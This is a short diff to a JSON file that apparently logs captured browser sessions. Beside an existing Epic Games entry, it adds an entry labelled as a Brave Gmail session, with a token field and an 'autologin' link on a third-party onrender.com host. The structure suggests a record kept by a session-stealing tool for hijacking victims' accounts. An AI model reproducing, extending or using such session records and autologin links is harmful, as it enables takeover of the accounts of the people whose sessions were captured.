@@ -632,6 +632,12 @@
             "token": "[Brave - EPICGAMES Link/Session]: https://www.epicgames.com/site/account/personal?productName=egs",
             "link": "https://threesrh-system-data.onrender.com/autologin?platform=epic&token=%5BBrave%20-%20EPICGAMES%20Link%2FSession%5D%3A%20https%3A%2F%2Fwww.epicgames.com%2Fsite%2Faccount%2Fpersonal%3FproductName%3Degs",
             "time": 1789434607
+        },
+        {
+            "platform": "gmail",
+            "token": "[Brave - MAIL.GOOGLE Link/Session]: https://mail.google.com/mail/u/0/#inbox",
+            "link": "https://threesrh-system-data.onrender.com/autologin?platform=gmail&token=%5BBrave%20-%20MAIL.GOOGLE%20Link%2FSession%5D%3A%20https%3A%2F%2Fmail.google.com%2Fmail%2Fu%2F0%2F%23inbox",
+            "time": 1789434651
         }
     ]
 }
